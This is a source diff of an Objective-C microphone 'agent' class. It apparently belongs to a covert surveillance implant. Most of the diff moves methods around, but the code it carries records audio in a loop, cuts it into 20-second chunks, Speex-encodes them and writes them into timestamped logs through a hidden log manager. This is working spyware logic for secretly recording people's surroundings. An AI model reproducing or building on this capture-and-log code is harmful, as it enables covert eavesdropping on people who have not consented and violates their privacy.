@@ -67,14 +67,13 @@ void myInputAudioCallback(void                               *inUserData,
 
 @interface __m_MAgentMicrophone (private)
 
-- (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
-                         withSeconds: (float)seconds;
-
 - (BOOL)_speexEncodeBuffer: (char *)input
                   withSize: (u_int)audioChunkSize
                   channels: (u_int)channels
                fileCounter: (int)fileCounter;
 
+- (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
+                         withSeconds: (float)seconds;
 @end
 
 @implementation __m_MAgentMicrophone (private)
@@ -404,25 +403,25 @@ void myInputAudioCallback(void                               *inUserData,
   return self;
 }
 
-- (id)retain
-{
-  return self;
-}
-
 - (unsigned)retainCount
 {
   // Denotes an object that cannot be released
   return UINT_MAX;
 }
 
-- (void)release
+- (id)retain
 {
-  // Do nothing
+  return self;
 }
 
 - (id)autorelease
 {
   return self;
+}
+
+- (void)release
+{
+  // Do nothing
 }
 
 - (id)init
@@ -447,6 +446,167 @@ void myInputAudioCallback(void                               *inUserData,
   }
   
   return sharedAgentMicrophone;
+}
+
+- (void)generateLog
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+#ifdef DEBUG_MIC
+  infoLog(@"Generating log for microphone");
+#endif
+  
+  if (mLoTimestamp     == 0
+      && mHiTimestamp  == 0)
+  {
+    time_t unixTime;
+    time(&unixTime);
+    int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
+    
+    int32_t hiTimestamp = (int64_t)filetime >> 32;
+    int32_t loTimestamp = (int64_t)filetime & 0xFFFFFFFF;
+    
+    mLoTimestamp = loTimestamp;
+    mHiTimestamp = hiTimestamp;
+  }
+  
+  [mLockGeneric lock];
+  NSMutableData *_audioBuffer = [[NSMutableData alloc] initWithData: mAudioBuffer];
+  [mAudioBuffer release];
+  mAudioBuffer = [[NSMutableData alloc] init];
+  [mLockGeneric unlock];
+  
+#ifdef DEBUG_MIC
+  infoLog(@"Creating log, TODO");
+#endif
+  
+#ifdef DEBUG_MIC_WAVE
+  NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
+  NSMutableData *audioData        = [[NSMutableData alloc] init];
+  
+  waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
+  
+  NSString *riff    = @"RIFF";
+  NSString *waveFmt = @"WAVEfmt "; // w00t
+  NSString *data    = @"data";
+  
+  int audioChunkSize = [_audioBuffer length];
+  int fileSize = audioChunkSize + 44; // size of header + strings
+  int fmtSize  = 16;
+  
+  waveFileHeader->formatTag       = 1;
+  waveFileHeader->nChannels       = 2;
+  waveFileHeader->nSamplesPerSec  = mDataFormat.mSampleRate;
+  waveFileHeader->bitsPerSample   = 16;
+  waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
+  waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
+  
+  [audioData appendData: [riff dataUsingEncoding: NSUTF8StringEncoding]];
+  [audioData appendBytes: &fileSize
+                  length: sizeof(int)];
+  [audioData appendData: [waveFmt dataUsingEncoding: NSUTF8StringEncoding]];
+  
+  [audioData appendBytes: &fmtSize
+                  length: sizeof(int)];
+  [audioData appendData: headerData];
+  [audioData appendData: [data dataUsingEncoding: NSUTF8StringEncoding]];
+  [audioData appendBytes: &audioChunkSize
+                  length: sizeof(int)];
+  
+  // Append audio chunk
+  [audioData appendData: _audioBuffer];
+  NSString *filePath = [NSString stringWithFormat: @"/tmp/temp_%d.wav", mFileCounter];
+  [audioData writeToFile: filePath
+              atomically: YES];
+  
+  [headerData release];
+  [audioData release];
+#endif
+  
+  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
+                                        initWithLength: sizeof(microphoneAdditionalStruct)];
+  microphoneAdditionalStruct *agentAdditionalHeader;
+  agentAdditionalHeader = (microphoneAdditionalStruct *)[rawAdditionalHeader bytes];
+  
+  u_int _sampleRate = mDataFormat.mSampleRate;
+  _sampleRate       |= LOG_AUDIO_CODEC_SPEEX;
+  
+  agentAdditionalHeader->version     = LOG_MICROPHONE_VERSION;
+  agentAdditionalHeader->sampleRate  = _sampleRate;
+  agentAdditionalHeader->hiTimestamp = mHiTimestamp;
+  agentAdditionalHeader->loTimestamp = mLoTimestamp;
+  
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
+  
+  u_int fileNumber = 0;
+  [mLockGeneric lock];
+  fileNumber = mFileCounter;
+  [mLockGeneric unlock];
+  
+  BOOL success = [logManager createLog: AGENT_MICROPHONE
+                           agentHeader: rawAdditionalHeader
+                             withLogID: fileNumber];
+  
+  if (success == TRUE)
+  {
+#ifdef DEBUG_MIC
+    infoLog(@"logHeader created correctly");
+#endif
+    
+    [self _speexEncodeBuffer: [_audioBuffer mutableBytes]
+                    withSize: [_audioBuffer length]
+                    channels: 2
+                 fileCounter: fileNumber];
+    
+    [logManager closeActiveLog: AGENT_MICROPHONE
+                     withLogID: fileNumber];
+  }
+  
+  [rawAdditionalHeader release];
+  [_audioBuffer release];
+  
+  [mLockGeneric lock];
+  mFileCounter    += 1;
+  [mLockGeneric unlock];
+  
+  [outerPool release];
+}
+
+- (void)stopRecord
+{
+#ifdef DEBUG_MIC
+  verboseLog(@"");
+#endif
+  OSStatus result;
+  
+  //
+  // Stop the queue
+  //
+  result = AudioQueueStop(mQueue, true);
+  if (result != noErr)
+  {
+#ifdef DEBUG_MIC
+    errorLog(@"AudioQueueStop: %d", result);
+#endif
+  }
+  
+  mIsRunning = NO;
+  
+  //
+  // Dispose the audio queue
+  //
+  result = AudioQueueDispose(mQueue, true);
+  if (result != noErr)
+  {
+#ifdef DEBUG_MIC
+    errorLog(@"AudioQueueDispose: %d", result);
+#endif
+  }
+  
+  //
+  // In order to avoid keeping something old in the buffer
+  //
+  [mAudioBuffer setLength: 0];
 }
 
 - (void)startRecord
@@ -526,43 +686,6 @@ void myInputAudioCallback(void                               *inUserData,
   [pool release];
 }
 
-- (void)stopRecord
-{
-#ifdef DEBUG_MIC
-  verboseLog(@"");
-#endif
-  OSStatus result;
-
-  //
-  // Stop the queue
-  //
-  result = AudioQueueStop(mQueue, true);
-  if (result != noErr)
-    {
-#ifdef DEBUG_MIC
-      errorLog(@"AudioQueueStop: %d", result);
-#endif
-    }
-
-  mIsRunning = NO;
-  
-  //
-  // Dispose the audio queue
-  //
-  result = AudioQueueDispose(mQueue, true);
-  if (result != noErr)
-    {
-#ifdef DEBUG_MIC
-      errorLog(@"AudioQueueDispose: %d", result);
-#endif
-    }
-  
-  //
-  // In order to avoid keeping something old in the buffer
-  //
-  [mAudioBuffer setLength: 0];
-}
-
 - (void)setupAudioWithFormatID: (UInt32)formatID
 {
   //
@@ -591,221 +714,13 @@ void myInputAudioCallback(void                               *inUserData,
     }
 }
 
-- (void)generateLog
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG_MIC
-  infoLog(@"Generating log for microphone");
-#endif
-  
-  if (mLoTimestamp     == 0
-      && mHiTimestamp  == 0)
-    {
-      time_t unixTime;
-      time(&unixTime);
-      int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
-      
-      int32_t hiTimestamp = (int64_t)filetime >> 32;
-      int32_t loTimestamp = (int64_t)filetime & 0xFFFFFFFF;
-      
-      mLoTimestamp = loTimestamp;
-      mHiTimestamp = hiTimestamp;
-    }
- 
-  [mLockGeneric lock];
-  NSMutableData *_audioBuffer = [[NSMutableData alloc] initWithData: mAudioBuffer];
-  [mAudioBuffer release];
-  mAudioBuffer = [[NSMutableData alloc] init];
-  [mLockGeneric unlock];
-  
-#ifdef DEBUG_MIC
-  infoLog(@"Creating log, TODO");
-#endif
-
-#ifdef DEBUG_MIC_WAVE
-  NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
-  NSMutableData *audioData        = [[NSMutableData alloc] init];
-
-  waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
-
-  NSString *riff    = @"RIFF";
-  NSString *waveFmt = @"WAVEfmt "; // w00t
-  NSString *data    = @"data";
-
-  int audioChunkSize = [_audioBuffer length];
-  int fileSize = audioChunkSize + 44; // size of header + strings
-  int fmtSize  = 16;
-
-  waveFileHeader->formatTag       = 1;
-  waveFileHeader->nChannels       = 2;
-  waveFileHeader->nSamplesPerSec  = mDataFormat.mSampleRate;
-  waveFileHeader->bitsPerSample   = 16;
-  waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
-  waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
-
-  [audioData appendData: [riff dataUsingEncoding: NSUTF8StringEncoding]];
-  [audioData appendBytes: &fileSize
-                  length: sizeof(int)];
-  [audioData appendData: [waveFmt dataUsingEncoding: NSUTF8StringEncoding]];
-
-  [audioData appendBytes: &fmtSize
-                  length: sizeof(int)];
-  [audioData appendData: headerData];
-  [audioData appendData: [data dataUsingEncoding: NSUTF8StringEncoding]];
-  [audioData appendBytes: &audioChunkSize
-                  length: sizeof(int)];
-
-  // Append audio chunk
-  [audioData appendData: _audioBuffer];
-  NSString *filePath = [NSString stringWithFormat: @"/tmp/temp_%d.wav", mFileCounter];
-  [audioData writeToFile: filePath
-              atomically: YES];
-
-  [headerData release];
-  [audioData release];
-#endif
-
-  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
-                                        initWithLength: sizeof(microphoneAdditionalStruct)];
-  microphoneAdditionalStruct *agentAdditionalHeader;
-  agentAdditionalHeader = (microphoneAdditionalStruct *)[rawAdditionalHeader bytes];
-  
-  u_int _sampleRate = mDataFormat.mSampleRate;
-  _sampleRate       |= LOG_AUDIO_CODEC_SPEEX;
-  
-  agentAdditionalHeader->version     = LOG_MICROPHONE_VERSION;
-  agentAdditionalHeader->sampleRate  = _sampleRate;
-  agentAdditionalHeader->hiTimestamp = mHiTimestamp;
-  agentAdditionalHeader->loTimestamp = mLoTimestamp;
-  
-  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
-  
-  u_int fileNumber = 0;
-  [mLockGeneric lock];
-  fileNumber = mFileCounter;
-  [mLockGeneric unlock];
-
-  BOOL success = [logManager createLog: AGENT_MICROPHONE
-                           agentHeader: rawAdditionalHeader
-                             withLogID: fileNumber];
-
-  if (success == TRUE)
-    {
-#ifdef DEBUG_MIC
-      infoLog(@"logHeader created correctly");
-#endif
-      
-      [self _speexEncodeBuffer: [_audioBuffer mutableBytes]
-                      withSize: [_audioBuffer length]
-                      channels: 2
-                   fileCounter: fileNumber];
-  
-      [logManager closeActiveLog: AGENT_MICROPHONE
-                       withLogID: fileNumber];
-    }
-
-  [rawAdditionalHeader release];
-  [_audioBuffer release];
-
-  [mLockGeneric lock];
-  mFileCounter    += 1;
-  [mLockGeneric unlock];
-
-  [outerPool release];
-}
-
 #pragma mark -
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
-- (void)start
+- (BOOL)resume
 {
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  //int fileCounter;
-
-  if (mIsRunning == YES)
-    {
-      // We're already running
-#ifdef DEBUG_MIC
-      warnLog(@"Agent Mic already running");
-#endif
-      [outerPool release];
-      return;
-    }
-  
-  [mAgentConfiguration setObject: AGENT_RUNNING
-                          forKey: @"status"];
-  
-  NSDate *micStartedDate = [NSDate date];
-  NSTimeInterval interval = 0;
-  
-  //
-  // Grab config parameters
-  //
-  microphoneAgentStruct *microphoneRawData;
-  microphoneRawData = (microphoneAgentStruct *)[[mAgentConfiguration
-                                                 objectForKey: @"data"] bytes];
-  
-  //
-  // Set config parameters
-  //
-  mIsVADActive      = microphoneRawData->detectSilence;
-  mSilenceThreshold = microphoneRawData->silenceThreshold;
-
-  //
-  // Start recording
-  //
-  [self startRecord];
-
-  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
-         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
-      
-      if (fabs(interval) >= 20)
-        {
-//          [mLockGeneric lock];
-//          fileCounter    = mFileCounter;
-//          [mLockGeneric unlock];
-          
-#ifdef DEBUG_MIC
-          infoLog(@"Logging #%d", fileCounter);
-#endif
-
-//          [NSThread detachNewThreadSelector: @selector(generateLog)
-//                                   toTarget: self
-//                                 withObject: nil];
-          [self generateLog];
-
-          micStartedDate = [[NSDate date] retain];
-        }
-        
-      [innerPool drain];
-      usleep(5000);
-    }
-
-#ifdef DEBUG_MIC
-  infoLog(@"Exiting microphone");
-#endif
-
-  if (mIsRunning)
-    {
-      [self stopRecord];
-    }
-
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    {      
-      mIsRunning = FALSE;
-      [mAgentConfiguration setObject: AGENT_STOPPED
-                              forKey: @"status"];
-      
-      mLoTimestamp = 0;
-      mHiTimestamp = 0;
-    }
-  
-  [outerPool release];
+  return TRUE;
 }
 
 - (BOOL)stop
@@ -837,14 +752,103 @@ void myInputAudioCallback(void                               *inUserData,
   return YES;
 }
 
-- (BOOL)resume
+- (void)start
 {
-  return TRUE;
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  //int fileCounter;
+  
+  if (mIsRunning == YES)
+  {
+    // We're already running
+#ifdef DEBUG_MIC
+    warnLog(@"Agent Mic already running");
+#endif
+    [outerPool release];
+    return;
+  }
+  
+  [mAgentConfiguration setObject: AGENT_RUNNING
+                          forKey: @"status"];
+  
+  NSDate *micStartedDate = [NSDate date];
+  NSTimeInterval interval = 0;
+  
+  //
+  // Grab config parameters
+  //
+  microphoneAgentStruct *microphoneRawData;
+  microphoneRawData = (microphoneAgentStruct *)[[mAgentConfiguration
+                                                 objectForKey: @"data"] bytes];
+  
+  //
+  // Set config parameters
+  //
+  mIsVADActive      = microphoneRawData->detectSilence;
+  mSilenceThreshold = microphoneRawData->silenceThreshold;
+  
+  //
+  // Start recording
+  //
+  [self startRecord];
+  
+  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
+         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
+    
+    if (fabs(interval) >= 20)
+    {
+      //          [mLockGeneric lock];
+      //          fileCounter    = mFileCounter;
+      //          [mLockGeneric unlock];
+      
+#ifdef DEBUG_MIC
+      infoLog(@"Logging #%d", fileCounter);
+#endif
+      
+      //          [NSThread detachNewThreadSelector: @selector(generateLog)
+      //                                   toTarget: self
+      //                                 withObject: nil];
+      [self generateLog];
+      
+      micStartedDate = [[NSDate date] retain];
+    }
+    
+    [innerPool drain];
+    usleep(5000);
+  }
+  
+#ifdef DEBUG_MIC
+  infoLog(@"Exiting microphone");
+#endif
+  
+  if (mIsRunning)
+  {
+    [self stopRecord];
+  }
+  
+  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
+  {      
+    mIsRunning = FALSE;
+    [mAgentConfiguration setObject: AGENT_STOPPED
+                            forKey: @"status"];
+    
+    mLoTimestamp = 0;
+    mHiTimestamp = 0;
+  }
+  
+  [outerPool release];
 }
 
 #pragma mark -
 #pragma mark Getter/Setter
 #pragma mark -
+
+- (NSMutableDictionary *)mAgentConfiguration
+{
+  return mAgentConfiguration;
+}
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
 {
@@ -853,11 +857,6 @@ void myInputAudioCallback(void                               *inUserData,
       [mAgentConfiguration release];
       mAgentConfiguration = [aConfiguration retain];
     }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
 }
 
 @end
